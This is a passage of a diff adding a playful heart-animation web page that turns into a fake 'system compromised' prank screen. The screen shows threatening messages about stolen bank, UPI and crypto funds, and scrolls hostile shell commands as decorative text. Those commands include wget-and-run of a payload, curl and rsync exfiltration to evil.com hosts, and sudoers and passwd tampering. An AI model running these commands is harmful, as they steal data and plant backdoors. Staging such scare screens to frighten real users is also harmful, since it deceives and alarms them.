+                right: 15%;
+                transform: translateY(-50%) scale(1) rotateY(0deg);
+                opacity: 1;
+            }
+        }
+
+        .portrait-frame {
+            width: 300px;
+            height: 400px;
+            background: linear-gradient(45deg, #8B0000, #FF0000, #8B0000, #000000);
+            border-radius: 20px;
+            padding: 10px;
+            box-shadow: 
+                0 0 50px rgba(255, 0, 0, 0.8),
+                0 0 100px rgba(139, 0, 0, 0.6),
+                inset 0 0 20px rgba(255, 0, 0, 0.3),
+                0 0 150px rgba(0, 0, 0, 0.9);
+            animation: dangerousPortraitGlow 3s ease-in-out infinite alternate;
+            position: relative;
+            overflow: hidden;
+            border: 3px solid #8B0000;
+        }
+
+        @keyframes dangerousPortraitGlow {
+            0% {
+                box-shadow: 
+                    0 0 50px rgba(255, 0, 0, 0.8),
+                    0 0 100px rgba(139, 0, 0, 0.6),
+                    inset 0 0 20px rgba(255, 0, 0, 0.3),
+                    0 0 150px rgba(0, 0, 0, 0.9);
+                filter: brightness(0.8) contrast(1.2);
+            }
+            100% {
+                box-shadow: 
+                    0 0 80px rgba(255, 0, 0, 1),
+                    0 0 150px rgba(139, 0, 0, 0.8),
+                    inset 0 0 30px rgba(255, 0, 0, 0.5),
+                    0 0 200px rgba(0, 0, 0, 1);
+                filter: brightness(1.1) contrast(1.5);
+            }
+        }
+
+        .portrait-inner {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #000000, #1a0000, #330000, #000000);
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #FF0000;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid #8B0000;
+        }
+
+        .portrait-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
+            animation: dangerousPortraitTitlePulse 2s ease-in-out infinite;
+            color: #FF0000;
+        }
+
+        @keyframes dangerousPortraitTitlePulse {
+            0%, 100% { 
+                transform: scale(1);
+                filter: brightness(1) contrast(1);
+            }
+            50% { 
+                transform: scale(1.05);
+                filter: brightness(1.3) contrast(1.5);
+            }
+        }
+
+        .portrait-subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .portrait-icon {
+            font-size: 4rem;
+            margin: 20px 0;
+            animation: portraitIconSpin 4s linear infinite;
+        }
+
+        @keyframes portraitIconSpin {
+            0% { transform: rotateY(0deg); }
+            100% { transform: rotateY(360deg); }
+        }
+
+        .main-image-cinematic {
+            width: 400px;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 
+                0 0 60px rgba(255, 0, 0, 0.8),
+                0 0 120px rgba(139, 0, 0, 0.6),
+                inset 0 0 20px rgba(255, 0, 0, 0.2),
+                0 0 150px rgba(0, 0, 0, 0.9);
+            animation: dangerousMainImageGlow 3s ease-in-out infinite alternate;
+            border: 5px solid;
+            border-image: linear-gradient(45deg, #8B0000, #FF0000, #8B0000) 1;
+        }
+
+        @keyframes dangerousMainImageGlow {
+            0% {
+                filter: brightness(0.8) saturate(1.3) contrast(1.2) sepia(0.3);
+                transform: scale(1);
+            }
+            100% {
+                filter: brightness(1.1) saturate(1.5) contrast(1.4) sepia(0.5) drop-shadow(0 0 30px rgba(255,0,0,0.8));
+                transform: scale(1.02);
+            }
+        }
+
+        .success-message {
+            position: absolute;
+            top: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 1.8rem;
+            color: #ff0000;
+            text-shadow: 
+                0 0 15px rgba(255, 0, 0, 1),
+                0 0 30px rgba(255, 0, 0, 0.8),
+                0 0 45px rgba(255, 0, 0, 0.6),
+                0 0 60px rgba(139, 0, 0, 0.4);
+            font-weight: bold;
+            text-align: center;
+            animation: successMessageAppear 2s ease-out 4s forwards, dangerousPulse 2s ease-in-out 6s infinite;
+            opacity: 0;
+            z-index: 10000002;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+            white-space: nowrap;
+            line-height: 1;
+        }
+
+        @keyframes successMessageAppear {
+            0% {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-50px) scale(0.5);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0) scale(1);
+            }
+        }
+
+        @keyframes dangerousPulse {
+            0%, 100% {
+                transform: translateX(-50%) scale(1);
+                text-shadow: 
+                    0 0 15px rgba(255, 0, 0, 1),
+                    0 0 30px rgba(255, 0, 0, 0.8),
+                    0 0 45px rgba(255, 0, 0, 0.6),
+                    0 0 60px rgba(139, 0, 0, 0.4);
+                filter: brightness(1);
+            }
+            50% {
+                transform: translateX(-50%) scale(1.1);
+                text-shadow: 
+                    0 0 20px rgba(255, 0, 0, 1),
+                    0 0 40px rgba(255, 0, 0, 1),
+                    0 0 60px rgba(255, 0, 0, 0.8),
+                    0 0 80px rgba(139, 0, 0, 0.6);
+                filter: brightness(1.3) contrast(1.2);
+            }
+        }
+
+        .connection-line {
+            position: absolute;
+            top: 50%;
+            left: 35%;
+            width: 30%;
+            height: 4px;
+            background: linear-gradient(90deg, #8B0000, #FF0000, #8B0000);
+            transform: translateY(-50%) scaleX(0);
+            animation: dangerousConnectionLineGrow 2s ease-out 5s forwards;
+            z-index: 10000000;
+            box-shadow: 
+                0 0 15px rgba(255, 0, 0, 0.8),
+                0 0 30px rgba(139, 0, 0, 0.6);
+            border-radius: 2px;
+            display: none; /* Hide the connection line */
+        }
+
+        @keyframes dangerousConnectionLineGrow {
+            0% {
+                transform: translateY(-50%) scaleX(0);
+                opacity: 0;
+                filter: brightness(0.5);
+            }
+            100% {
+                transform: translateY(-50%) scaleX(1);
+                opacity: 1;
+                filter: brightness(1.2) contrast(1.5);
+            }
+        }
+
+        .particle-burst {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10000003;
+        }
+
+        .burst-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: radial-gradient(circle, #FFD700, transparent);
+            border-radius: 50%;
+            animation: burstParticleFloat 3s ease-out forwards;
+        }
+
+        @keyframes burstParticleFloat {
+            0% {
+                opacity: 1;
+                transform: scale(0) translateY(0);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1) translateY(-100px);
+            }
+            100% {
+                opacity: 0;
+                transform: scale(0.5) translateY(-200px);
+            }
+        }
+
+        /* Enhanced particles with more colors */
+        .enhanced-particle {
+            position: absolute;
+            border-radius: 50%;
+            animation: enhancedFloat 8s ease-in-out infinite;
+            background: radial-gradient(circle, rgba(255,107,107,0.8), rgba(255,107,107,0.2));
+        }
+
+        @keyframes enhancedFloat {
+            0%, 100% { 
+                transform: translateY(0px) rotate(0deg) scale(1);
+                background: radial-gradient(circle, rgba(255,107,107,0.8), rgba(255,107,107,0.2));
+            }
+            25% {
+                transform: translateY(-30px) rotate(90deg) scale(1.2);
+                background: radial-gradient(circle, rgba(78,205,196,0.8), rgba(78,205,196,0.2));
+            }
+            50% { 
+                transform: translateY(-15px) rotate(180deg) scale(0.8);
+                background: radial-gradient(circle, rgba(255,206,84,0.8), rgba(255,206,84,0.2));
+            }
+            75% {
+                transform: translateY(-40px) rotate(270deg) scale(1.1);
+                background: radial-gradient(circle, rgba(163,190,140,0.8), rgba(163,190,140,0.2));
+            }
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2.5rem;
+            }
+            
+            .text-input {
+                min-width: 250px;
+                font-size: 1rem;
+            }
+            
+            .create-btn {
+                font-size: 1rem;
+                padding: 12px 25px;
+            }
+            
+            .input-container {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background particles -->
+    <div class="bg-particles" id="bgParticles"></div>
+
+    <!-- Main content -->
+    <div class="container">
+        <h1 class="title">Heart Cloud Dreams</h1>
+        <div class="input-container">
+            <input type="text" class="text-input" id="textInput" placeholder="Type your message here... (or try 'planberlin')" maxlength="50">
+            <button class="create-btn" onclick="createHeartCloud()">✨ Create Magic</button>
+        </div>
+    </div>
+
+    <!-- Heart cloud container -->
+    <div class="heart-cloud-container" id="heartContainer"></div>
+
+    <!-- Cinematic Sequence -->
+    <div class="cinematic-overlay" id="cinematicOverlay">
+        <div class="eraser-wave" id="eraserWave"></div>
+        <div class="portrait-container" id="portraitContainer">
+            <div class="portrait-frame">
+                <div class="portrait-inner">
+                    <div class="portrait-title">🎯 TARGET ACQUIRED</div>
+                    <div class="portrait-subtitle">Cracking Sequence</div>
+                    <div class="portrait-icon">🔓</div>
+                    <div style="font-size: 0.9rem; opacity: 0.8;">PLAN BERLIN</div>
+                    <div style="font-size: 0.8rem; margin-top: 10px; color: #00ff00;">✅ VERIFIED</div>
+                </div>
+            </div>
+        </div>
+        <div class="image-container-cinematic" id="imageContainerCinematic">
+            <img src="https://images.lifestyleasia.com/wp-content/uploads/sites/2/2024/01/15143020/untitled-design-2024-01-12t144027-454.jpeg" alt="Plan Berlin" class="main-image-cinematic" />
+        </div>
+        <div class="connection-line" id="connectionLine"></div>
+        <div class="success-message" id="successMessage">
+            🔥 CRACKED 🔥
+        </div>
+        <div class="particle-burst" id="particleBurst"></div>
+    </div>
+
+    <!-- Crack Discovery Animation -->
+    <div class="crack-discovery" id="crackDiscovery">
+        <div class="golden-particles" id="goldenParticles"></div>
+    </div>
+
+    <!-- Plan Berlin Special Screen -->
+    <div class="planberlin-screen" id="planberlinScreen">
+        <div class="planberlin-sparkles" id="planberlinSparkles"></div>
+        <div class="planberlin-container">
+            <div class="planberlin-title">🎆 CRACKED: PLAN BERLIN DISCOVERED 🎆</div>
+            <div class="planberlin-image-container">
+                <img src="https://images.lifestyleasia.com/wp-content/uploads/sites/2/2024/01/15143020/untitled-design-2024-01-12t144027-454.jpeg" alt="Plan Berlin" class="planberlin-image" />
+            </div>
+            <div class="planberlin-subtitle">✨ LEGENDARY SECRET UNLOCKED ✨</div>
+        </div>
+    </div>
+
+    <!-- Hacking Screen -->
+    <div class="hack-screen" id="hackScreen">
+        <div class="hack-header">🔴 SYSTEM COMPROMISED 🔴</div>
+        <div class="hack-content">
+            <div class="code-lines" id="codeLines"></div>
+        </div>
+        <div class="loading-text" id="loadingText">EXTRACTING DATA...</div>
+        <div class="loading-bar">
+            <div class="loading-fill"></div>
+        </div>
+    </div>
+
+    <script>
+        let clickCount = 0;
+        let isShattered = false;
+        let isPlanBerlinActive = false;
+        let keyBuffer = '';
+        let lastKeyTime = 0;
+        
+        // Real-time key detection for Plan Berlin trigger
+        const PLAN_BERLIN_TRIGGER = 'planberlin';
+        const KEY_TIMEOUT = 2000; // 2 seconds timeout between keys
+        
+        // Global keydown listener for Plan Berlin detection
+        document.addEventListener('keydown', function(e) {
+            if (isPlanBerlinActive || isShattered) return;
+            
+            const currentTime = Date.now();
+            
+            // Reset buffer if too much time has passed
+            if (currentTime - lastKeyTime > KEY_TIMEOUT) {
+                keyBuffer = '';
+            }
+            
+            lastKeyTime = currentTime;
+            
+            // Add key to buffer (only letters and numbers)
+            if (e.key.length === 1 && /[a-zA-Z0-9]/.test(e.key)) {
+                keyBuffer += e.key.toLowerCase();
+                console.log('Key buffer:', keyBuffer); // Debug
+                
+                // Keep buffer reasonable size
+                if (keyBuffer.length > 20) {
+                    keyBuffer = keyBuffer.slice(-20);
+                }
+                
+                // Check for Plan Berlin trigger
+                if (keyBuffer.includes(PLAN_BERLIN_TRIGGER)) {
+                    console.log('🎯 PLAN BERLIN DETECTED! Starting sequence...');
+                    e.preventDefault();
+                    // Immediately start the sequence
+                    startPlanBerlinSequence();
+                    keyBuffer = ''; // Reset buffer
+                }
+            }
+        });
+        
+        // Also check input field changes
+        document.addEventListener('input', function(e) {
+            if (isPlanBerlinActive || isShattered) return;
+            
+            const value = e.target.value ? e.target.value.toLowerCase() : '';
+            console.log('Input value:', value); // Debug
+            if (value.includes(PLAN_BERLIN_TRIGGER)) {
+                console.log('🎯 PLAN BERLIN DETECTED IN INPUT! Starting sequence...');
+                e.preventDefault();
+                startPlanBerlinSequence();
+            }
+        });
+        
+        // Check for Plan Berlin in any text input
+        document.addEventListener('keyup', function(e) {
+            if (isPlanBerlinActive || isShattered) return;
+            
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                const value = e.target.value.toLowerCase();
+                if (value.includes(PLAN_BERLIN_TRIGGER)) {
+                    isPlanBerlinActive = true;
+                    activatePlanBerlin();
+                }
+            }
+        });
+
+        // Enhanced background particles with more variety
+        function createBackgroundParticles() {
+            const container = document.getElementById('bgParticles');
+            for (let i = 0; i < 40; i++) {
+                const particle = document.createElement('div');
+                
+                // Randomly choose particle type
+                const particleTypes = ['particle', 'enhanced-particle'];
+                particle.className = particleTypes[Math.floor(Math.random() * particleTypes.length)];
+                
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.width = Math.random() * 20 + 10 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.animationDelay = Math.random() * 10 + 's';
+                
+                // Add random colors
+                const hue = Math.random() * 360;
+                particle.style.background = `radial-gradient(circle, hsla(${hue}, 80%, 70%, 0.8), hsla(${hue}, 80%, 70%, 0.2))`;
+                particle.style.boxShadow = `0 0 20px hsla(${hue}, 80%, 70%, 0.5)`;
+                
+                container.appendChild(particle);
+            }
+        }
+
+        // Mega enhanced sparkle effect with multiple types
+        function createSparkles() {
+            const sparkleTypes = ['normal', 'golden', 'rainbow', 'cosmic', 'electric'];
+            
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const sparkle = document.createElement('div');
+                    const type = sparkleTypes[Math.floor(Math.random() * sparkleTypes.length)];
+                    
+                    sparkle.className = `sparkle ${type}-sparkle`;
+                    sparkle.style.left = Math.random() * 100 + '%';
+                    sparkle.style.top = Math.random() * 100 + '%';
+                    sparkle.style.animationDelay = Math.random() * 3 + 's';
+                    
+                    switch(type) {
+                        case 'golden':
+                            sparkle.style.background = `hsl(${Math.random() * 60 + 30}, 90%, 70%)`;
+                            sparkle.style.boxShadow = '0 0 15px gold';
+                            break;
+                        case 'rainbow':
+                            sparkle.style.background = `hsl(${Math.random() * 360}, 90%, 70%)`;
+                            sparkle.style.animation += ', rainbow-sparkle 2s linear infinite';
+                            break;
+                        case 'cosmic':
+                            sparkle.style.background = 'radial-gradient(circle, #fff, #00f, #f0f)';
+                            sparkle.style.boxShadow = '0 0 25px #00f';
+                            break;
+                        case 'electric':
+                            sparkle.style.background = 'linear-gradient(45deg, #fff, #0ff, #fff)';
+                            sparkle.style.boxShadow = '0 0 20px #0ff';
+                            break;
+                        default:
+                            sparkle.style.background = 'white';
+                    }
+                    
+                    sparkle.style.width = Math.random() * 12 + 6 + 'px';
+                    sparkle.style.height = sparkle.style.width;
+                    document.body.appendChild(sparkle);
+                    
+                    setTimeout(() => sparkle.remove(), 4000);
+                }, i * 100);
+            }
+        }
+
+        // Advanced crack effect with sound simulation and screen shake
+        function createCrackEffect() {
+            // Add screen shake effect
+            document.body.style.animation = 'screenShake 0.5s ease-in-out 3';
+            
+            const overlay = document.createElement('div');
+            overlay.className = 'crack-overlay';
+            overlay.style.background = 'rgba(0,0,0,0.1)';
+            document.body.appendChild(overlay);
+
+            // Create advanced crack patterns
+            const crackPoints = [
+                { x: 30, y: 20 }, { x: 70, y: 30 }, { x: 20, y: 60 }, { x: 80, y: 50 },
+                { x: 50, y: 80 }, { x: 40, y: 10 }, { x: 90, y: 70 }, { x: 10, y: 40 },
+                { x: 60, y: 90 }, { x: 85, y: 15 }, { x: 15, y: 85 }, { x: 75, y: 25 },
+                { x: 25, y: 75 }, { x: 95, y: 55 }, { x: 5, y: 45 }, { x: 55, y: 5 }
+            ];
+
+            crackPoints.forEach((point, index) => {
+                setTimeout(() => {
+                    // Main crack
+                    const crack = document.createElement('div');
+                    crack.className = 'crack mega-crack';
+                    
+                    const angle = Math.random() * 360;
+                    const length = Math.random() * 500 + 300;
+                    const width = Math.random() * 6 + 3;
+                    
+                    crack.style.left = point.x + '%';
+                    crack.style.top = point.y + '%';
+                    crack.style.width = width + 'px';
+                    crack.style.transform = `rotate(${angle}deg)`;
+                    crack.style.setProperty('--crack-height', length + 'px');
+                    crack.style.background = `linear-gradient(0deg, 
+                        rgba(0,0,0,0.9) 0%, 
+                        rgba(50,50,50,0.95) 20%, 
+                        rgba(0,0,0,0.9) 40%,
+                        rgba(80,80,80,0.8) 60%,
+                        rgba(0,0,0,0.9) 80%,
+                        rgba(30,30,30,0.95) 100%)`;
+                    crack.style.boxShadow = `
+                        0 0 15px rgba(0,0,0,0.9),
+                        inset 0 0 8px rgba(255,255,255,0.1),
+                        0 0 30px rgba(0,0,0,0.7),
+                        inset 2px 0 5px rgba(0,0,0,0.8)`;
+                    
+                    overlay.appendChild(crack);
+
+                    // Multiple branch cracks for realism
+                    for (let i = 0; i < 5; i++) {
+                        setTimeout(() => {
+                            const branch = document.createElement('div');
+                            branch.className = 'crack branch-crack';
+                            
+                            const branchAngle = angle + (Math.random() - 0.5) * 120;
+                            const branchLength = length * (0.2 + Math.random() * 0.6);
+                            const branchOffset = length * (0.1 + Math.random() * 0.8);
+                            
+                            const offsetX = Math.cos(angle * Math.PI / 180) * branchOffset;
+                            const offsetY = Math.sin(angle * Math.PI / 180) * branchOffset;
+                            
+                            branch.style.left = (point.x + offsetX/15) + '%';
+                            branch.style.top = (point.y + offsetY/15) + '%';
+                            branch.style.width = (width * (0.4 + Math.random() * 0.4)) + 'px';
+                            branch.style.transform = `rotate(${branchAngle}deg)`;
+                            branch.style.setProperty('--crack-height', branchLength + 'px');
+                            branch.style.background = crack.style.background;
+                            branch.style.boxShadow = crack.style.boxShadow;
+                            
+                            overlay.appendChild(branch);
+                        }, i * 200);
+                    }
+                }, index * 150);
+            });
+
+            // Enhanced screen shatter effect with multiple layers
+            setTimeout(() => {
+                document.body.classList.add('screen-shatter');
+                document.body.style.filter = 'contrast(1.8) brightness(0.4) saturate(0.1) blur(3px)';
+                
+                // Add static noise effect
+                const noise = document.createElement('div');
+                noise.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    background: repeating-linear-gradient(
+                        90deg,
+                        transparent,
+                        transparent 2px,
+                        rgba(255,255,255,0.03) 2px,
+                        rgba(255,255,255,0.03) 4px
+                    );
+                    pointer-events: none;
+                    z-index: 99998;
+                    animation: staticNoise 0.1s linear infinite;
+                `;
+                document.body.appendChild(noise);
+            }, 1200);
+        }
+
+        // Enhanced freeze function with additional effects
+        function freezeEverything() {
+            document.body.classList.add('frozen');
+            // Disable all interactive elements
+            const inputs = document.querySelectorAll('input, button, textarea, select');
+            inputs.forEach(input => {
+                input.disabled = true;
+                input.style.cursor = 'not-allowed';
+                input.style.opacity = '0.3';
+            });
+            
+            // Add freeze overlay
+            const freezeOverlay = document.createElement('div');
+            freezeOverlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: radial-gradient(circle, rgba(0,100,255,0.1) 0%, rgba(0,0,0,0.3) 100%);
+                pointer-events: none;
+                z-index: 99997;
+            `;
+            document.body.appendChild(freezeOverlay);
+            
+            // Start hack sequence after enhanced delay
+            setTimeout(startHackSequence, 4000);
+        }
+
+        // Start the realistic hacking sequence
+        function startHackSequence() {
+            const hackScreen = document.getElementById('hackScreen');
+            hackScreen.classList.add('active');
+            
+            // Start code scrolling
+            startCodeScrolling();
+            
+            // Show threatening messages
+            setTimeout(showThreatMessages, 2000);
+            
+            // Show financial alerts
+            setTimeout(showFinancialAlerts, 4000);
+        }
+
+        // Generate and scroll hacker code
+        function startCodeScrolling() {
+            const codeContainer = document.getElementById('codeLines');
+            
+            const hackingCommands = [
+                'root@darkweb:~# accessing mainframe...',
+                'BREACH DETECTED: Firewall disabled',
+                'sudo rm -rf /system/security/*',
+                'nc -lvp 4444 < /dev/urandom',
+                'echo "HACKED" > /etc/passwd',
+                'cat /proc/meminfo | grep -i hack',
+                'ps aux | grep -i malware',
+                'netstat -an | grep :80',
+                'iptables -F && iptables -X',
+                'wget http://malicious-site.com/payload.sh',
+                'chmod +x payload.sh && ./payload.sh',
+                'python3 -c "import socket,subprocess,os;s=socket.socket()"',
+                'gcc -o backdoor backdoor.c && ./backdoor',
+                'curl -X POST http://evil.com/data --data @/etc/passwd',
+                'nmap -sS -O target_ip',
+                'sqlmap -u "http://target.com" --dump',
+                'hydra -l admin -P passwords.txt ssh://target',
+                'msfconsole -x "use exploit/multi/handler"',
+                'john --wordlist=rockyou.txt hash.txt',
+                'aircrack-ng -w wordlist.txt capture.cap',
+                'ettercap -T -M arp:remote /192.168.1.1-254/',
+                'tcpdump -i eth0 -w capture.pcap',
+                'wireshark -k -i eth0',
+                'hashcat -m 0 -a 0 hash.txt wordlist.txt',
+                'volatility -f memdump.raw imageinfo',
+                'binwalk -e firmware.bin',
+                'strings malware.exe | grep -i password',
+                'objdump -d malware.exe | grep call',
+                'strace -e trace=network nc target 80',
+                'ltrace ./suspicious_binary',
+                'gdb -batch -ex run -ex bt --args ./exploit',
+                'radare2 -A malware.bin',
+                'xxd -l 256 /dev/urandom',
+                'openssl enc -aes-256-cbc -in file -out file.enc',
+                'ssh-keygen -t rsa -b 4096 -f ./id_rsa',
+                'scp stolen_data.zip user@remote:/tmp/',
+                'rsync -avz /home/user/ attacker@evil.com:/loot/',
+                'tar -czf backup.tar.gz /etc/shadow',
+                'dd if=/dev/sda of=disk_image.img bs=4096',
+                'mount -o loop,ro disk_image.img /mnt/forensics',
+                'grep -r "password" /var/log/',
+                'find / -name "*.key" -type f 2>/dev/null',
+                'awk -F: "$3==0{print $1}" /etc/passwd',
+                'sed -i "s/root:x:/root::/g" /etc/passwd',
+                'echo "* * * * * /bin/sh" | crontab -',
+                'systemctl disable firewall && systemctl stop firewall',
+                'useradd -m -s /bin/bash hacker && echo "hacker:pwned" | chpasswd',
+                'chmod 777 /etc/sudoers',
+                'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
+                'ACCESSING PERSONAL DATA...',
+                'BREAKING ENCRYPTION...',
+                'UPLOADING TO DARK WEB...',
+                'INSTALLING BACKDOOR...',
+                'COMPROMISING SYSTEM INTEGRITY...',
+                'BYPASSING ANTIVIRUS...',
+                'ESCALATING PRIVILEGES...',
+                'MAINTAINING PERSISTENCE...',
+                'COVERING TRACKS...'
+            ];
+            
+            function addCodeLine() {
+                const line = document.createElement('div');
+                line.style.color = Math.random() > 0.7 ? '#ff0000' : '#00ff00';
+                line.textContent = hackingCommands[Math.floor(Math.random() * hackingCommands.length)];
+                codeContainer.appendChild(line);
+                
+                // Keep only last 30 lines
+                if (codeContainer.children.length > 30) {
+                    codeContainer.removeChild(codeContainer.firstChild);
+                }
+                
+                // Random delay for realistic effect
+                setTimeout(addCodeLine, Math.random() * 200 + 50);
+            }
+            
+            addCodeLine();
+        }
+
+        // Show threatening messages
+        function showThreatMessages() {
+            const messages = [
+                '😈 YOUR SYSTEM IS COMPROMISED!',
+                '⚠️ ALL FILES ARE BEING ENCRYPTED!',
+                '🔴 IDENTITY STOLEN - DATA BREACHED!',
+                '💸 BANK ACCOUNTS ACCESSED!',
+                '📱 PHONE CONTACTS EXTRACTED!',
+                '📧 EMAILS BEING FORWARDED!',
+                '🗺️ LOCATION TRACKING ACTIVE!',
+                '💳 CREDIT CARDS CLONED!',
+                '🖥️ WEBCAM ACTIVATED!',
+                '🎤 MICROPHONE RECORDING!'
+            ];
+            
+            function showMessage() {
+                const message = document.createElement('div');
+                message.className = 'threat-message';
+                message.textContent = messages[Math.floor(Math.random() * messages.length)];
+                message.style.top = Math.random() * 60 + 10 + '%';
+                message.style.left = Math.random() * 60 + 20 + '%';
+                document.body.appendChild(message);
+                
+                setTimeout(() => message.remove(), 4000);
+                setTimeout(showMessage, Math.random() * 3000 + 2000);
+            }
+            
+            showMessage();
+        }
+
+        // Show financial alerts
+        function showFinancialAlerts() {
+            const alerts = [
+                '🚨 TRANSFERRING ₹' + Math.floor(Math.random() * 50000 + 1000) + ' TO OFFSHORE ACCOUNT',
+                '💳 CARD **** ' + Math.floor(Math.random() * 9000 + 1000) + ' CHARGED ₹' + Math.floor(Math.random() * 25000 + 5000),
+                '📱 OTP ' + Math.floor(Math.random() * 9000 + 1000) + ' INTERCEPTED',
+                '🏦 ACCESSING BANK OF INDIA ACCOUNT',
+                '💰 CRYPTO WALLET DRAINED: ' + Math.floor(Math.random() * 10) + '.' + Math.floor(Math.random() * 99999999) + ' BTC',
+                '🛡️ UPI PIN CRACKED: ' + Math.floor(Math.random() * 9000 + 1000),
+                '💸 PAYTM BALANCE TRANSFERRED: ₹' + Math.floor(Math.random() * 15000 + 2000),
+                '💳 GPAY TRANSACTION: ₹' + Math.floor(Math.random() * 30000 + 5000) + ' DEBITED',
+                '💥 PHONEPE ACCOUNT COMPROMISED',
+                '⚡ INSTANT LOAN APPROVED: ₹' + Math.floor(Math.random() * 100000 + 25000)
+            ];
+            
+            function showAlert() {
+                const alert = document.createElement('div');
+                alert.className = 'financial-alert';
+                alert.innerHTML = alerts[Math.floor(Math.random() * alerts.length)];
+                alert.style.top = Math.random() * 70 + 15 + '%';
+                alert.style.right = '20px';
+                document.body.appendChild(alert);
+                
+                setTimeout(() => alert.remove(), 6000);
+                setTimeout(showAlert, Math.random() * 4000 + 3000);
+            }
+            
+            showAlert();
+            
+            // Update loading text
+            const loadingTexts = [
+                'EXTRACTING BANK DETAILS...',
+                'ACCESSING AADHAR DATA...',
+                'DOWNLOADING PHOTOS...',
+                'COPYING PASSWORDS...',
+                'STEALING CRYPTO KEYS...',
+                'UPLOADING TO DARK WEB...',
+                'SELLING ON BLACK MARKET...'
+            ];
+            
+            let textIndex = 0;
+            setInterval(() => {
+                document.getElementById('loadingText').textContent = loadingTexts[textIndex % loadingTexts.length];
+                textIndex++;
+            }, 3000);
+        }
+
+        // Enhanced heart cloud animation
+        function createHeartCloud() {
+            if (isShattered) return;
+            
+            const text = document.getElementById('textInput').value.trim();
+            
+            // Check for Plan Berlin trigger
+            if (text.toLowerCase() === 'planberlin') {
+                activatePlanBerlin();
+                return;
+            }
+            
+            clickCount++;
+            
+            // Check if we should trigger crack effect
+            if (clickCount >= 10 && !isShattered) {
+                isShattered = true;
+                createCrackEffect();
+                setTimeout(freezeEverything, 1500);
+                return;
+            }
+            
+            if (!text) return;
+
+            const container = document.getElementById('heartContainer');
+            
+            // Create enhanced sparkle effect
+            createSparkles();
+
+            // Create more heart clouds for extra beauty
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    // Create heart symbol with variety
+                    const hearts = ['💖', '💝', '💕', '💗', '💓', '💘', '💟', '❤️', '🧡', '💛', '💚', '💙', '💜'];
+                    const heart = document.createElement('div');
+                    heart.className = 'heart-cloud';
+                    heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
+                    heart.style.left = Math.random() * 80 + 10 + '%';
+                    heart.style.animationDelay = Math.random() * 2 + 's';
+                    heart.style.fontSize = (Math.random() * 3 + 1.5) + 'rem';
+                    heart.style.filter = `hue-rotate(${Math.random() * 360}deg) brightness(1.2)`;
+                    container.appendChild(heart);
+
+                    // Create text element with rainbow effect
+                    const textElement = document.createElement('div');
+                    textElement.className = 'heart-text';
+                    textElement.textContent = text;
+                    textElement.style.left = Math.random() * 70 + 15 + '%';
+                    textElement.style.animationDelay = (Math.random() * 2 + 1) + 's';
+                    textElement.style.fontSize = (Math.random() * 0.8 + 1.2) + 'rem';
+                    textElement.style.background = `linear-gradient(45deg, hsl(${Math.random() * 360}, 80%, 70%), hsl(${Math.random() * 360}, 80%, 70%))`;
+                    textElement.style.webkitBackgroundClip = 'text';
+                    textElement.style.webkitTextFillColor = 'transparent';
+                    textElement.style.backgroundClip = 'text';
+                    container.appendChild(textElement);
+
+                    // Remove elements after animation
+                    setTimeout(() => {
+                        heart.remove();
+                        textElement.remove();
+                    }, 15000);
+                }, i * 500);
+            }
+
+            // Clear input
+            document.getElementById('textInput').value = '';
+        }
+
+        // Single function to handle the entire Plan Berlin sequence
+        function startPlanBerlinSequence() {
+            if (isPlanBerlinActive) return; // Prevent multiple activations
+            isPlanBerlinActive = true;
+            
+            console.log('🚀 STARTING PLAN BERLIN SEQUENCE!');
+            
+            // Clear input immediately
+            const textInput = document.getElementById('textInput');
+            if (textInput) textInput.value = '';
+            
+            // Step 1: Immediate black screen takeover
+            const cinematicOverlay = document.getElementById('cinematicOverlay');
+            if (cinematicOverlay) {
+                cinematicOverlay.style.display = 'block';
+                cinematicOverlay.style.opacity = '0';
+                cinematicOverlay.style.transition = 'opacity 1s ease';
+                
+                // Force immediate display
+                setTimeout(() => {
+                    cinematicOverlay.style.opacity = '1';
+                    console.log('🎦 Black screen activated');
+                }, 100);
+            }
+            
+            // Step 2: Start eraser effect
+            setTimeout(() => {
+                const eraserWave = document.getElementById('eraserWave');
+                if (eraserWave) {
+                    eraserWave.style.display = 'block';
+                    console.log('🌊 Eraser wave started');
+                }
+            }, 1000);
+            
+            // Step 3: Fly in portrait from left
+            setTimeout(() => {
+                const portraitContainer = document.getElementById('portraitContainer');
+                if (portraitContainer) {
+                    portraitContainer.style.display = 'block';
+                    portraitContainer.style.left = '-500px';
+                    portraitContainer.style.transition = 'all 3s ease-out';
+                    
+                    setTimeout(() => {
+                        portraitContainer.style.left = '10%';
+                        console.log('🖼️ Portrait flying in');
+                    }, 100);
+                }
+            }, 2000);
+            
+            // Step 4: Fly in image from right
+            setTimeout(() => {
+                const imageContainer = document.getElementById('imageContainerCinematic');
+                if (imageContainer) {
+                    imageContainer.style.display = 'block';
